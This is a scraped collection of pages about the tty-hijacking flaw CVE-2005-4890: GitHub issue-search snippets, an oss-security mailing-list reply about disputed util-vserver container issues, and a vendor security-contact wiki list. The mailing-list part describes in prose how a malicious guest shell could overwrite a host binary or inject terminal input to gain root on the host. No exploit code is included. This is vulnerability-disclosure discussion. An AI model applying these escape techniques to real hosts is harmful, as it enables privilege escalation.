# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-2005-4890%2522)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fsearch&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# issues Search Results · "CVE-2005-4890"

## Filter by

* + [Code... (...)results](https://github.com/search?type=code&q=%22CVE-2005-4890%22)
  + [Repositoriesresults](https://github.com/search?type=repositories&q=%22CVE-2005-4890%22)
  + [Issuesresults](https://github.com/search?type=issues&q=%22CVE-2005-4890%22)
  + [Pull requestsresults](https://github.com/search?type=pullrequests&q=%22CVE-2005-4890%22)
  + [Discussionsresults](https://github.com/search?type=discussions&q=%22CVE-2005-4890%22)
  + [Usersresults](https://github.com/search?type=users&q=%22CVE-2005-4890%22)
  + More
* ### State

  + [Open](https://github.com/search?type=Issues&q=%22CVE-2005-4890%22&state=open)
  + [Closed](https://github.com/search?type=Issues&q=%22CVE-2005-4890%22&state=closed)
* ### Advanced

  + Owner
  + State
  + Close reason
  + [Has linked pull request](https://github.com/search?type=Issues&q=%22CVE-2005-4890%22+linked%3Apr)
  + Author
  + Assignee
  + Mentioned user
  + Mentioned team
  + Commenter
  + Involved user
  + Label
  + Milestone
  + Number of comments
  + Number of interactions
* [Advanced search](https://github.com/search/advanced)
Issues0 (0)0 results  (75 ms)
## 0 results

Sort by:  Best matchFilter
### [grafana/loki](/grafana/loki)[Provide both alpine and debian promtail images](/grafana/loki/issues/838)

component/packagingkeepalive

* ![](https://avatars.githubusercontent.com/u/630212?s=48&v=4)rfratto
·* 15
·* Opened  on Aug 1, 2019
·* [#838](/grafana/loki/issues/838)
### [containers/bubblewrap](/containers/bubblewrap) [CVE-2017-5226 -- bubblewrap escape via TIOCSTI ioctl](/containers/bubblewrap/issues/142)

I should note here for completeness that at least one member of the Debian security team seems to think this and its
clones (*CVE*-*2005*-*4890*, *CVE*-2016-7545, CVE-2016-2781, CVE-2016-2779, CVE-2016-2568 ...

* ![](https://avatars.githubusercontent.com/u/1561141?s=48&v=4)smcv
·* 5
·* Opened  on Jan 9, 2017
·* [#142](/containers/bubblewrap/issues/142)
### [canonical/ubuntu.com](/canonical/ubuntu.com)[Check out CVE patches and tags design](/canonical/ubuntu.com/issues/8189)

Project

* ![](https://avatars.githubusercontent.com/u/6387619?s=48&v=4)albertkol
·* 6
·* Opened  on Aug 28, 2020
·* [#8189](/canonical/ubuntu.com/issues/8189)
### [sympa-community/sympa](/sympa-community/sympa)[[SA 2020-002] Security flaws in setuid wrappers, CVE-2020-10936](/sympa-community/sympa/issues/943)

... should be readily apparent to anyone that has looked at similar
vulnerabilities in other setuid binaries. A few examples: *CVE*-*2005*-*4890*, *CVE*-2019-12577, CVE-2017-6964, CVE-2018-1386.
I would have ...bugsecurity

* ![](https://avatars.githubusercontent.com/u/5743546?s=48&v=4)ikedas
·* 15
·* Opened  on May 24, 2020
·* [#943](/sympa-community/sympa/issues/943)
### [IgnorantGuru/spacefm](/IgnorantGuru/spacefm)[root commands not working [Slackware, others?]](/IgnorantGuru/spacefm/issues/394)

... vulnerable to tty-hijacking (*CVE*-*2005*-*4890*) because it gave the command a
controlling tty. Shadow 4.1.5 addressed this by detaching the controlling terminal via a TIOCNOTTY request when invoking
su -c when ...invalid

* ![](https://avatars.githubusercontent.com/u/10137?s=48&v=4)ghost
·* 33
·* Opened  on Dec 1, 2013
·* [#394](/IgnorantGuru/spacefm/issues/394)
![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Press the / key to activate the search input again and adjust your query.![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Restrict your search to the title by using the in:title qualifier.

You can’t perform that action at this time.



=== Content from www.openwall.com_ba2f1488_20250125_011811.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](8) [[next>]](../../../2014/10/21/1) [[<thread-prev]](../../../2014/10/14/7) [[thread-next>]](../../../2014/10/21/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <54456183.7030800@igalia.com>
Date: Mon, 20 Oct 2014 21:24:51 +0200
From: Carlos Alberto Lopez Perez <clopez@...lia.com>
To: Fiedler Roman <Roman.Fiedler@....ac.at>
CC: 766073@...s.debian.org, vserver@...t.linux-vserver.org,
 me@...fdog.net, oss-security@...ts.openwall.com
Subject: Re: Multiple disputed issues in util-vserver

On 14/10/14 16:31, Fiedler Roman wrote:
> Hi,
>
> While fixing a bug, I noticed some strange behavior in linux vserver
> virtualization, that I would call a security problems, but project
> developers see it differently. Since the util-vserver packages and patched
> kernel were or are included in some Linux distros, I would be interested in
> the communities' opinion on that.
>
> Issue 1: When calling util-vserver tool on the host to execute a job within
> the guest, e.g. to install updates, the host process (in host PID ns) might
> end up being the child of a guest process (with PID only in guest ns), thus
> the parent PID of the host process pointing to a guest ns PID. If the host
> process wants to signal the parent process or some other tool operates using
> the ppid, a host process might interact with another arbitrary host process
> on error (see [1]). Compared to issue 2-3, I'm not sure for myself if it is
> really a bug and what the correct behavior of kernel with pid namespaces
> would be. At least it breaks bash process handling (gets stuck) when calling
> "vserver exec" in a certain way, start-stop-daemon or upstart might not like
> it also.
>

Is there any (practical) scenario in which an attacker that has
compromised an vserver guest could use this behavior to compromise or
execute code on the host (master)?

> Issue 2: When entering the container from the host or executing commands
> within the container, e.g. to perform common administrative tasks, a
> malicious login shell inside the container might overwrite the
> /usr/sbin/vcontext on the host, thus allowing on to execute arbitrary code
> on the host with root privileges next time vcontext is invoked. See [3].
> Feedback from developer: " Yes, vlogin is known to have several security
> issues. It's a maintenance backdoor, much like the iLO or iDRAC on hardware.
> If you can find ways to improve it, patches would be accepted, but I doubt
> it will ever be possible to do what it does securely." Project documentation
> does not strike out those restrictions (or at least I did not find that or
> the list of "several known security issues" online), other sources, e.g.
> container vs system virtualization comparison strike out the importance of
> the feature to enter a guest from the host easily for maintenance, so I
> guess that those tools were not useful just for me alone. This issue I would
> rate a killer for production use, e.g. for mass hosting.
>

Can you please send me the PoC for this issue ?

> Issue 3: It seems that handling of open tty FDs on enter, that allows to
> inject arbitrary keyboard input to be read by the parent process, also
> affects the tool to start the guest container. This seems to be the same
> issue with "vserver start" as reported in [2] for vserver enter, which was
> classified as less relevant back than. My rating would be little lower than
> 2 but still quite high for mass hosting: manual restart, e.g. during
> maintenance, seems quite common to me.
>

If I understand correctly, this (and the previous one) are
CVE-2005-4890, isn't it?.

<http://www.halfdog.net/Security/2012/TtyPushbackPrivilegeEscalation>

> From my point of view, those issues might be expected behavior as claimed by
> the developers, but if so it should be at least stated more clearly in
> documentation:
>
> a) never use any tools except vserver stop (to terminate the container) to
> interact with a running and possibly compromised container from the host
> b) only use network/socket-based tools to connect to processes inside a
> possibly compromised guest, e.g. SSH.
> c) never start a possibly compromised container from interactive shell to
> avoid injection of shell commands
>
> Regarding documentation I would even vote for a solution d), that all those
> tools get a mandatory argument like
> '--i-know-entering-insecure-container-may-kill-my-host' so that it is not
> very likely, that someone will use those tools for something else then
> testing or nice-world administration.
>
> Opinions to issues 1-3?
>
> What about solutions?
>

Halfdog (CC'ed) already suggested some possible solutions:
<http://www.paul.sladen.org/vserver/archives/201211/0011.html>

> Kind regards,
> Roman
>
> [1]
> <http://list.linux-vserver.org/archive?mss:6788:201410:moeiomapkoefmmdnmcji>
> [2] <http://www.openwall.com/lists/oss-security/2012/11/05/8>
> [3] Guest -> Host escape POC: C-code to be put as /bin/bash replacement in
> guest, will overwrite /usr/sbin/vcontext on host. Available on request
>
>
> DI Roman Fiedler
> Scientist
> Safety & Security Department
> Assistive Healthcare Information Technology
>
> AIT Austrian Institute of Technology GmbH
> Reininghausstraße 13/1  |  8020 Graz  |  Austria
> T +43(0) 50550 2957  |  M +43(0) 664 8561599  |  F +43(0) 50550 2950
> roman.fiedler@....ac.at | <http://www.ait.ac.at/>
>
> FN: 115980 i HG Wien  |  UID: ATU14703506
> <http://www.ait.ac.at/Email-Disclaimer>
>

Download attachment "[signature.asc](9/1)" of type "application/pgp-signature" (884 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from oss-security.openwall.org_1298e9e4_20250126_050033.html ===

[[[vendors](/wiki/vendors?do=backlink "Backlinks")]]

[OSS-Security](/wiki/welcome "[H]")

Trace: • [vendors](/wiki/vendors "vendors")

### Table of Contents

* [Security-Related Vendor Information](#security-related-vendor-information)
  + [Amazon Linux AMI / Amazon Web Services](#amazon-linux-amiamazon-web-services)
  + [Apple Inc.](#apple-inc)
  + [Arch Linux](#arch-linux)
  + [Debian](#debian)
  + [DragonFly BSD](#dragonfly-bsd)
  + [Enea](#enea)
  + [FreeBSD](#freebsd)
  + [Frugalware Linux](#frugalware-linux)
  + [Gentoo Linux](#gentoo-linux)
  + [Homebrew](#homebrew)
  + [IBM](#ibm)
  + [Mageia](#mageia)
  + [Microsoft Linux Systems Group](#microsoft-linux-systems-group)
  + [MontaVista Software, LLC.](#montavista-software-llc)
  + [NetBSD](#netbsd)
  + [OpenBSD](#openbsd)
  + [OpenSUSE and SUSE](#opensuse-and-suse)
  + [Openwall](#openwall)
  + [Oracle Linux](#oracle-linux)
  + [Parallels Inc.](#parallels-inc)
  + [pkgsrc (NetBSD Packages Collection for multiple OS's incl. \*Bsd, Linux, Solaris, OSX, etc.)](#pkgsrc-netbsd-packages-collection-for-multiple-os-s-incl-bsd-linux-solaris-osx-etc)
  + [Qlustar](#qlustar)
  + [Red Hat Inc](#red-hat-inc)
  + [Solaris](#solaris)
  + [TurrisOS](#turrisos)
  + [Ubuntu](#ubuntu)
  + [VMware, Inc.](#vmware-inc)
  + [Wind River](#wind-river)
* [Other Resources](#other-resources)

# Security-Related Vendor Information

This page lists security contacts, bug tracker links, links to advisories, etc. for various open source-providing vendors, such as distributors of Linux, \*BSD, and other related operating systems.

When adding to this page, please include the following vendor information:

1. link to bug tracker (i.e. Bugzilla)
2. link to security advisories, errata, or any other page that provides notification of security-related updates/changes
3. email address for the security contact

As well, please keep this list in alphabetical order.

## Amazon Linux AMI / Amazon Web Services

* Security bulletins: [Amazon Linux AMI Security Center](https://aws.amazon.com/amazon-linux-ami/security-bulletins/ "https://aws.amazon.com/amazon-linux-ami/security-bulletins/") ([RSS feed](http://aws.amazon.com/rss/amazon-linux-ami.rss "http://aws.amazon.com/rss/amazon-linux-ami.rss"))
* Security contact: aws [dash] security [at] amazon [dot] com [PGP key](https://aws.amazon.com/security/aws-pgp-public-key/ "https://aws.amazon.com/security/aws-pgp-public-key/")
* [AWS Security Center](http://aws.amazon.com/security/ "http://aws.amazon.com/security/")
* [Vulnerability reporting information](http://aws.amazon.com/security/vulnerability-reporting/ "http://aws.amazon.com/security/vulnerability-reporting/")
## Apple Inc.

* [Security process information](http://www.apple.com/support/security/ "http://www.apple.com/support/security/")
* Security issues should be sent to product [dash] security [at] apple [dot] com
* Alternatively, reported through the [Apple Bug Reporter](https://developer.apple.com/bug-reporting/ "https://developer.apple.com/bug-reporting/")
* [Security advisories](https://support.apple.com/en-au/HT201222 "https://support.apple.com/en-au/HT201222")
## Arch Linux

* [Arch Linux bug tracker (public issues)](https://bugs.archlinux.org "https://bugs.archlinux.org")
* Security issues should be sent to security [at] archlinux [dot] org
## Debian

* [Debian bug tracker (public issues only)](http://bugs.debian.org "http://bugs.debian.org"), [Security issue tracker (public issues only)](http://security-tracker.debian.org "http://security-tracker.debian.org")
* Security issues should be sent to security [at] debian [dot] org
* Recent advisories are listed upon [our front page](http://security.debian.org/ "http://security.debian.org/")
## DragonFly BSD

* DragonFly Security Officer: security [at] dragonflybsd [dot] org ([PGP key](http://www.dragonflybsd.org/keys/ "http://www.dragonflybsd.org/keys/"))
## Enea

* [The process for receiving security advisories requires a Support or Maintenance subscription](http://lists.enea.com/mailman/listinfo/security-announce "http://lists.enea.com/mailman/listinfo/security-announce")
* [Bug tracking database - access requires a Support or Maintenance subscription](http://eneaissues.enea.com/ "http://eneaissues.enea.com/")
* Enea Security: [http://www.enea.com/solutions/Enea-Linux/Security](http://www.enea.com/solutions/Enea-Linux/Security "http://www.enea.com/solutions/Enea-Linux/Security")
* Enea security contacts can be reached at security [at] enea [dot] com
## FreeBSD

* [How and where to report a FreeBSD security issue](https://www.freebsd.org/security/reporting.html "https://www.freebsd.org/security/reporting.html")
  + All FreeBSD security issues should be reported to the FreeBSD Security Team at secteam [at] FreeBSD [dot] org
  + For a higher level of confidentiality, PGP-encrypted e-mail may be sent to the Security Officer Team at security [dash] officer [at] FreeBSD [dot] org ([PGP key](https://www.freebsd.org/security/so_public_key.asc "https://www.freebsd.org/security/so_public_key.asc"))
## Frugalware Linux

* Security issues should be sent to frugalware [dash] security [dash] private [at] frugalware [dot] org
* Advisories are published for the stable branch at the [Frugalware Security mailing list](http://frugalware.org/mailman/listinfo/frugalware-security/ "http://frugalware.org/mailman/listinfo/frugalware-security/")
## Gentoo Linux

* [Gentoo Bugzilla](https://bugs.gentoo.org/ "https://bugs.gentoo.org/") – see “Gentoo Security” product.
* Gentoo Linux Security Advisories (GLSA) published via [Mail](https://archives.gentoo.org/gentoo-announce/ "https://archives.gentoo.org/gentoo-announce/") ([subscribe](https://www.gentoo.org/get-involved/mailing-lists/ "https://www.gentoo.org/get-involved/mailing-lists/")), [HTTP](https://security.gentoo.org/glsa/ "https://security.gentoo.org/glsa/") and [Feeds](https://security.gentoo.org/subscribe "https://security.gentoo.org/subscribe").
* [Security Website](https://www.gentoo.org/support/security/ "https://www.gentoo.org/support/security/") with [Vulnerability Policy](https://www.gentoo.org/support/security/vulnerability-treatment-policy.html "https://www.gentoo.org/support/security/vulnerability-treatment-policy.html") and confidential contacts.
* Security contact: security [at] gentoo [dot] org, #gentoo-security on irc.freenode.net.
## Homebrew

* [Homebrew issue tracker](https://github.com/Homebrew/homebrew/issues "https://github.com/Homebrew/homebrew/issues")
* Security contact: security [at] brew [dot] sh
## IBM

* [How and where to report an IBM Product Security Incident](http://www-03.ibm.com/security/secure-engineering/report.html "http://www-03.ibm.com/security/secure-engineering/report.html")
* [Security Bulletins](http://www.ibm.com/connections/blogs/PSIRT "http://www.ibm.com/connections/blogs/PSIRT")
* [IBM Customer Support Portal](http://www-947.ibm.com/support/entry/portal/support "http://www-947.ibm.com/support/entry/portal/support")
* IBM Product Security Incident Support Team (PSIRT): psirt [at] us [dot] ibm [dot] com [PGP key](http://www-03.ibm.com/security/secure-engineering/IBM_PSIRT.asc "http://www-03.ibm.com/security/secure-engineering/IBM_PSIRT.asc")
## Mageia

* [Mageia Bugzilla](https://bugs.mageia.org "https://bugs.mageia.org")
* [Security and bugfix information)](http://advisories.mageia.org "http://advisories.mageia.org")
* Security contact: security [at] mageia [dot] org
## Microsoft Linux Systems Group

* Report security issues through the [Microsoft Security Response Center](https://www.microsoft.com/en-us/msrc "https://www.microsoft.com/en-us/msrc")
* Details on the reporting procedure are available  [here](https://portal.msrc.microsoft.com/en-us/engage/sbr "https://portal.msrc.microsoft.com/en-us/engage/sbr")
* Information about the bounty program [here](https://www.microsoft.com/en-us/msrc/bounty?rtc=1 "https://www.microsoft.com/en-us/msrc/bounty?rtc=1")
## MontaVista Software, LLC.

* The process for receiving security advisories requires a Support or Maintenance subscription.
* Bug tracking database - access requires a Support or Maintenance subscription.
* [Security Advisories](https://support.mvista.com/Security/CVE/ "https://support.mvista.com/Security/CVE/")
* MontaVista security contacts can be reached at security [at] mvista [dot] com [PGP key](https://support.mvista.com/Security/mv_psirt_pub_key.txt "https://support.mvista.com/Security/mv_psirt_pub_key.txt")
## NetBSD

* [Bug tracking database](http://www.netbsd.org/support/query-pr.html "http://www.netbsd.org/support/query-pr.html")
* [Contact and errata information](http://www.netbsd.org/support/security/ "http://www.netbsd.org/support/security/")
* Security contact: security [dash] alert [at] NetBSD [dot] org
* (for pkgsrc please see separate entry below)
## OpenBSD

* Bug tracking mailing list: bugs [at] openbsd [dot] org ([Archive](https://marc.info/?l=openbsd-bugs "https://marc.info/?l=openbsd-bugs"), [Subscribe](https://lists.openbsd.org/cgi-bin/mj_wwwusr?extra=bugs&func=lists-full-long "https://lists.openbsd.org/cgi-bin/mj_wwwusr?extra=bugs&func=lists-full-long"))
* [Security and errata information](https://www.openbsd.org/security.html "https://www.openbsd.org/security.html")
* Security contact: deraadt [at] openbsd [dot] org
## OpenSUSE and SUSE

* [Bugzilla](http://bugzilla.novell.com/ "http://bugzilla.novell.com/")
* [Security-support page](http://www.novell.com/linux/security/securitysupport.html "http://www.novell.com/linux/security/securitysupport.html")
* [SUSE Security Announcements RSS feed](http://www.novell.com/linux/security/suse_security.xml "http://www.novell.com/linux/security/suse_security.xml")
* [Mailing-list: opensuse-security-announce and opensuse-security](http://en.opensuse.org/Communicate/Mailinglists "http://en.opensuse.org/Communicate/Mailinglists")
* Security contact: security [at] suse [dot] de
## Openwall

* [Changes in the currently-maintained stable branch](http://www.openwall.com/Owl/CHANGES-stable.shtml "http://www.openwall.com/Owl/CHANGES-stable.shtml") (any security fixes are marked as such, along with issue severity information)
* [Changes in the development branch](http://www.openwall.com/Owl/CHANGES-current.shtml "http://www.openwall.com/Owl/CHANGES-current.shtml") (ditto)
* Security contact: security [at] owl [dot] openwall [dot] com
## Oracle Linux

* [Oracle Bugzilla](http://bugzilla.oracle.com/bugzilla/ "http://bugzilla.oracle.com/bugzilla/")
* [Oracle Linux Erratas](http://oss.oracle.com/pipermail/el-errata/ "http://oss.oracle.com/pipermail/el-errata/") includes security advisories
* [Security contact information](http://www.oracle.com/us/support/assurance/reporting/index.html "http://www.oracle.com/us/support/assurance/reporting/index.html") - email for reporting vulnerabilities: secalert\_us [at] oracle [dot] com
* [Oracle Linux](http://www.oracle.com/linux "http://www.oracle.com/linux") introduction, downloads, support offerings
* [Oracle security fix policy](http://www.oracle.com/us/support/assurance/fixing-policies/index.html "http://www.oracle.com/us/support/assurance/fixing-policies/index.html")
## Parallels Inc.

* Update announcements published via [Parallels KnowledgeBase](http://kb.sp.parallels.com "http://kb.sp.parallels.com") and [Parallels Cloud Server RSS](http://sp.parallels.com/products/pcs/rss "http://sp.parallels.com/products/pcs/rss"), [Parallels Containers for Linux RSS](http://sp.parallels.com/products/pvc/pcl-rss "http://sp.parallels.com/products/pvc/pcl-rss").
* Security contact: security [at] parallels [dot] com
## pkgsrc (NetBSD Packages Collection for multiple OS's incl. \*Bsd, Linux, Solaris, OSX, etc.)

* For issues in NetBSD please see the separate entry
* [Bug tracking database](http://www.netbsd.org/support/query-pr.html "http://www.netbsd.org/support/query-pr.html") – select 'pkg' Category
* [Vulnerable package versions database](http://ftp.netbsd.org/pub/NetBSD/packages/vulns/pkg-vulnerabilities "http://ftp.netbsd.org/pub/NetBSD/packages/vulns/pkg-vulnerabilities")
* Security contact: pkgsrc [dash] security [at] NetBSD [dot] org
* [PGP key](http://ftp.netbsd.org/pub/NetBSD/security/PGP/pkgsrc-security%40NetBSD.org.asc "http://ftp.netbsd.org/pub/NetBSD/security/PGP/pkgsrc-security@NetBSD.org.asc")
## Qlustar

* Qlustar Security Advisories (QSA) [Archive](https://qlustar.com/security-advisories "https://qlustar.com/security-advisories") ([subscribe](https://qlustar.com/newsletter/subscriptions "https://qlustar.com/newsletter/subscriptions")).
* Security contact: security [at] qlustar [dot] com
## Red Hat Inc

* Report security issues to secalert [at] redhat [dot] com or see [https://www.redhat.com/security/team/contact/](https://www.redhat.com/security/team/contact/ "https://www.redhat.com/security/team/contact/") for our keys and policies
* Advisories for all Red Hat products are published to [the RHSA announce mailing list](http://www.redhat.com/archives/rhsa-announce/ "http://www.redhat.com/archives/rhsa-announce/") since Nov 2007 (older are at [http://www.redhat.com/archives/enterprise-watch-list/](http://www.redhat.com/archives/enterprise-watch-list/ "http://www.redhat.com/archives/enterprise-watch-list/")).
## Solaris

* [Oracle Critical Patch Updates and Security Alerts](http://www.oracle.com/technetwork/topics/security/alerts-086861.html "http://www.oracle.com/technetwork/topics/security/alerts-086861.html")
* [Security contact information](http://www.oracle.com/us/support/assurance/reporting/index.html "http://www.oracle.com/us/support/assurance/reporting/index.html") - email for reporting vulnerabilities: secalert\_us [at] oracle [dot] com
* [Oracle security fix policy](http://www.oracle.com/us/support/assurance/fixing-policies/index.html "http://www.oracle.com/us/support/assurance/fixing-policies/index.html")
* [Changes in security policies for the Sun product lines](http://www.oracle.com/technetwork/topics/security/changesforsunsecuritypolicies-162219.html "http://www.oracle.com/technetwork/topics/security/changesforsunsecuritypolicies-162219.html")
## TurrisOS

* Use [https://gitlab.labs.nic.cz/turris/openwrt/issues](https://gitlab.labs.nic.cz/turris/openwrt/issues "https://gitlab.labs.nic.cz/turris/openwrt/issues") to report TurrisOS bugs (private security bugs can be opened by checking the “This issue is confidential and should only be visible to team members with at least Reporter access.” box).
* Security contacts for TurrisOS can be reached at security [at] turris [dot] cz.
## Ubuntu

* Use [Launchpad](https://launchpad.net/ubuntu/%2Bfilebug "https://launchpad.net/ubuntu/+filebug") to report Ubuntu bugs
  + Private security bugs can be opened by selecting the `“Private Security”` option in the `“This bug contains information that is:”` drop-down menu
* [Ubuntu Security Notices](https://usn.ubuntu.com/ "https://usn.ubuntu.com/") are sent to the [ubuntu-security-announce mailing list](https://lists.ubuntu.com/archives/ubuntu-security-announce/ "https://lists.ubuntu.com/archives/ubuntu-security-announce/")
* Security contacts for Ubuntu can be reached at security [at] ubuntu [dot] com or see the [Ubuntu Security FAQ](https://wiki.ubuntu.com/SecurityTeam/FAQ#Contact "https://wiki.ubuntu.com/SecurityTeam/FAQ#Contact") for more information
## VMware, Inc.

* VMware Security Advisories (VMSAs) are posted to [http://www.vmware.com/security/advisories](http://www.vmware.com/security/advisories "http://www.vmware.com/security/advisories").
* You can sign up for receiving security advisories at [http://www.vmware.com/security](http://www.vmware.com/security "http://www.vmware.com/security").
* Report security issues to security [at] vmware [dot] com or see the [VMware Security Response Policy](http://www.vmware.com/support/policies/security_response.html "http://www.vmware.com/support/policies/security_response.html") for more information.
## Wind River

* The process for receiving security advisories requires a Support or Maintenance subscription. [https://support.windriver.com/olsPortal/faces/basic/portal.jspx](https://support.windriver.com/olsPortal/faces/basic/portal.jspx "https://support.windriver.com/olsPortal/faces/basic/portal.jspx")
* [Info on what Wind River publicly disclose and what they don't; RSS feeds with the publicly disclosed info on security issues](http://www.openwall.com/lists/oss-security/2011/05/02/9 "http://www.openwall.com/lists/oss-security/2011/05/02/9")
* Wind River Linux security contacts can be reached at security [dash] alert [at] windriver [dot] com.
# Other Resources

There are separate wiki pages with similar information on [individual Open Source projects](/wiki/software "software") and the [infrastructure](/wiki/infrastructure "infrastructure").

There's a [similar page on the Distributions Wiki](http://distributions.freedesktop.org/wiki/DistributionLocations "http://distributions.freedesktop.org/wiki/DistributionLocations").

vendors.txt · Last modified: 2022/12/01 20:40 by akuster

Except where otherwise noted, content on this wiki is licensed under the following license: [CC Attribution-Noncommercial-Share Alike 3.0 Unported](https://creativecommons.org/licenses/by-nc-sa/3.0/)

[![Recent changes RSS feed](/wiki/lib/tpl/local/images/button-rss.png)](/wiki/feed.php "Recent changes RSS feed")
[![](/wiki/lib/images/license/button/cc-by-nc-sa.png)](https://creativecommons.org/licenses/by-nc-sa/3.0/ "CC Attribution-Noncommercial-Share Alike 3.0 Unported")
[![Donate to DokuWiki](/wiki/lib/tpl/local/images/button-donate.gif)](https://www.dokuwiki.org/donate "Donate to DokuWiki")
[![Powered by PHP](/wiki/lib/tpl/local/images/button-php.gif)](https://www.php.net "Powered by PHP")
[![Valid XHTML 1.0](/wiki/lib/tpl/local/images/button-xhtml.png)](https://validator.w3.org/check/referer "Valid XHTML 1.0")
[![Valid CSS](/wiki/lib/tpl/local/images/button-css.png)](https://jigsaw.w3.org/css-validator/check/referer?profile=css3 "Valid CSS")
[![Driven by DokuWiki](/wiki/lib/tpl/local/images/button-dw.png)](https://dokuwiki.org/ "Driven by DokuWiki")
[![Powered by OpenVZ](/wiki/lib/tpl/local/images/OpenVZ-80x15-cd.png)](https://openvz.org "Powered by OpenVZ - OS virtualization solution for Linux")
[![Powered by Openwall GNU/*/Linux](/wiki/lib/tpl/local/images/Owl-80x15-4.png)](https://www.openwall.com/Owl/ "Powered by Openwall GNU/*/Linux - security-enhanced \"Linux distribution\"")

![](/wiki/lib/exe/indexer.php?id=vendors&1737867628)


=== Content from access.redhat.com_feb3ccb2_20250125_011813.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
